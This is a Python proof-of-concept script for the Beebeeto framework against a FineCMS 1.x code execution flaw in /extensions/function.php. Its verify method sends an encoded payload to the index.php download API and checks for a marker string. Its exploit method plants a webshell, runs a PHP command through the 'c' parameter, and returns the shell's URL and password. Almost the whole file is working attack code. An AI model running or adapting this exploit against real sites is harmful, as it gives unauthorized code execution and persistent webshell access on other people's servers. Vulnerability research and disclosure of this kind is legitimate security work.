#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0006',  # 由Beebeeto官方编辑
            'name': 'FineCMS 1.x /extensions/function.php 代码执行漏洞 POC',  # 名称
            'author': '1024',  # 作者
            'create_date': '2014-08-01',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'FineCMS',  # 漏洞所涉及的应用名称
            'vul_version': ['1.x'],  # 受漏洞影响的应用版本
            'type': 'Code Execution',  # 漏洞类型
            'tag': ['FineCMS', '代码执行漏洞'],  # 漏洞相关tag
            'desc': '在/extensions/function.php中$data在一定条件下会带入eval函数，构造代码可造成代码执行。',  # 漏洞描述
            'references': ['http://wooyun.org/bugs/wooyun-2014-061643',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        vul_url = '%s/index.php?c=api&a=down&file=' % args['options']['target']
        payload = 'NGJiNHNudTZjRVI5MnNMYWpUS2p3M2NDWkdnM1o4NTNFbnlJOXZNdVNn' \
                  'a2xYdkpHS0ZoTkhyYnZrV3BrdEFWWjlWOE5Ua1A2L2MxbzF5b3BJM0hO' \
                  'enB4Snczdlc1Q3c'
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
            print '[*] POST Content: ' + payload
        response = urllib2.urlopen(vul_url + payload).read()
        if 'jgowjivqfrsabsd063' in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            return args
        else:
            args['success'] = False
            return args

    @classmethod
    def exploit(cls, args):
        vul_url = '%s/index.php?c=api&a=down&file=' % args['options']['target']
        payload = 'NmExNE9WTFFEbUhTOWJnd3Y3aWNoNjdtV3Z3SDZwbmtycG1pQStIR0ht' \
                  'S0dQTmZNS1lkVXJ5RHBoZGpmUGJFOUxhbjZESWc='
        data = {'c': 'echo strrev(adsbasrfqvijwogj33);'}
        if args['options']['verbose']:
            print '[*] Request URL: ' + vul_url
            print '[*] POST Content: ' + payload
        response = urllib2.urlopen(vul_url + payload, data=urllib.urlencode(data)).read()
        if '33jgowjivqfrsabsda' in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = vul_url
            args['poc_ret']['Webshell'] = vul_url + payload
            args['poc_ret']['Webshell_PWD'] = 'c'
            return args
        else:
            args['success'] = False
            return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
